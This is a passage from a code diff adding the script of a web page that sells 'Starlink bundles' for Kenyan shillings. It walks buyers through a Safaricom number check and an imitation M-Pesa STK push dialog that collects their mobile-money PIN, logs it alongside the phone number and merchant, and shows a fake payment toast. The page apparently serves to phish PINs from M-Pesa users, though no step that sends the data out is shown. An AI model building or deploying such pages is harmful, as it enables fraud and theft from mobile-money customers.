+                    showToast(`💰 You received Ksh ${amount} from ${simNumber} · Merchant ${MERCHANT}`, 7000);
+                }, 2000);
+                console.log(`M-Pesa: Ksh ${amount} from ${simNumber} to ${MERCHANT} (PIN:${pin}) for ${bundle}`);
+            }
+
+            document.querySelectorAll('.buy-btn').forEach(btn => {
+                btn.addEventListener('click', (e) => {
+                    e.stopPropagation();
+                    let ksh = btn.getAttribute('data-ksh');
+                    let name = btn.getAttribute('data-name');
+                    if (!ksh) {
+                        const special = btn.closest('.special-item');
+                        if (special) {
+                            const bigEl = special.querySelector('.big');
+                            if (bigEl) {
+                                ksh = bigEl.innerText.trim();
+                                name = '24h ' + ksh + 'GB';
+                            }
+                        }
+                    }
+                    if (!ksh) {
+                        const card = btn.closest('.bundle-card');
+                        if (card) {
+                            const priceDiv = card.querySelector('.price');
+                            if (priceDiv) {
+                                ksh = priceDiv.innerText.replace(/[^0-9]/g, '');
+                            }
+                            const title = card.querySelector('h3');
+                            if (title) name = title.innerText;
+                        }
+                    }
+                    ksh = ksh || '0';
+                    name = name || 'Starlink bundle';
+                    openPhoneModal(name, ksh);
+                });
+            });
+
+            cancelPhoneBtn.addEventListener('click', closePhoneModal);
+            submitPhoneBtn.addEventListener('click', () => {
+                const phone = customerPhoneInput.value.trim();
+                if (!phone.match(/^(07|01)\d{8}$/)) {
+                    alert('Please enter a valid Safaricom number (07XXXXXXXX)');
+                    return;
+                }
+                customerPhone = phone;
+                openStkPush(phone);
+            });
+            customerPhoneInput.addEventListener('keypress', (e) => {
+                if (e.key === 'Enter') submitPhoneBtn.click();
+            });
+
+            stkCancelBtn.addEventListener('click', closeStk);
+            stkSendBtn.addEventListener('click', processStkPayment);
+            stkPinInput.addEventListener('keypress', (e) => {
+                if (e.key === 'Enter') processStkPayment();
+            });
+            stkOverlay.addEventListener('click', (e) => {
+                if (e.target === stkOverlay) closeStk();
+            });
+            phoneModal.addEventListener('click', (e) => {
+                if (e.target === phoneModal) closePhoneModal();
+            });
+        })();
+    </script>
+</body>
+</html>
